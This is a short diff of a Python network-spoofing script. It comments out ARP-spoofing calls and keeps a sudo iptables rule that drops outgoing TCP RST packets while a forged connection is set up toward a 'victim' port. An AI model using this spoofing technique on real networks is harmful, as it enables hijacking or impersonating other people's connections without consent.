@@ -172,9 +172,9 @@ def initialize_fake_connection(src_ip, dst_ip):
 	dst_port = victim_port
 	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
 
-	mac_address = get_mac_address(network_interface)
-	arp_spoof(src_ip, mac_address)
-	
+	#mac_address = get_mac_address(network_interface)
+	#arp_spoof(src_ip, mac_address)
+
 	print('Setting iptables')
 	#print(terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -d {dst_ip} -j DROP'))
 	print(terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP'))
